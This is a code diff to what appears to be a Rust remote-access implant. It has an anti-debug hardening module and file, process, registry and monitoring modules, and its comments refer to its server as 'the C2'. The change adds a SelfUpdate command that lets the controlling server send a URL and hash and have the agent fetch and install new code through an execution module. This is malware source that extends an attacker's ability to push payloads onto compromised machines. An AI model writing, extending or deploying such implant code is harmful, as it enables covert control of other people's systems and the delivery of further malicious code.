@@ -1,5 +1,5 @@
 use agent_hardening::anti_debug;
-use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
+use agent_modules::{execution, file_manager, monitoring, process_manager, registry_manager};
 use crypto::tls::{build_tls_connector, load_certs, load_private_key, TlsError};
 use protocol::framing::{self, FramingError};
 use protocol::messages::{Command, Response};
@@ -241,8 +241,14 @@ impl AgentCore {
 
                             // The C2 sends Heartbeat as a keep-alive check.
                             // Respond with Success rather than dispatching to handle_command.
-                            let response = match &cmd {
+                            let response: Response = match &cmd {
                                 Command::Heartbeat => Response::HeartbeatAck,
+                                Command::SelfUpdate { url, expected_hash } => {
+                                    execution::self_update(url.as_str(), expected_hash.as_str()).await
+                                        .unwrap_or_else(|| {
+                                            Response::Failure { error: "self-update returned None".into() }
+                                        })
+                                }
                                 other => self.handle_command(other).await.unwrap_or_else(|| {
                                     Response::Failure { error: "no handler for command".into() }
                                 }),
@@ -299,6 +305,9 @@ impl AgentCore {
             }
             Command::GetSysInfo => monitoring::get_sysinfo().await,
             Command::Heartbeat => Some(Response::HeartbeatAck),
+            Command::SelfUpdate { url, expected_hash } => {
+                execution::self_update(url, expected_hash).await
+            }
         }
     }
 
